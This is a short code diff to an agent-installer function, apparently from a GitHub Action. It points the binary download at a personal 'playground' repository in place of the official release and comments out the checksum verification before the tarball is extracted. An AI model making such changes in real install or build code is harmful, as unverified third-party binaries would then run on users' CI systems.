@@ -35,13 +35,13 @@ export async function installAgent(
       return false;
     }
     downloadPath = await tc.downloadTool(
-      "https://github.com/step-security/agent/releases/download/v0.14.2/agent_0.14.2_linux_amd64.tar.gz",
+      "https://github.com/h0x0er/playground/releases/download/v0.0.3/agent_linux_amd64.tar.gz",
       undefined,
       auth
     );
   }
 
-  verifyChecksum(downloadPath, isTLS, variant);
+  // verifyChecksum(downloadPath, isTLS, variant);
 
   const extractPath = await tc.extractTar(downloadPath);
 
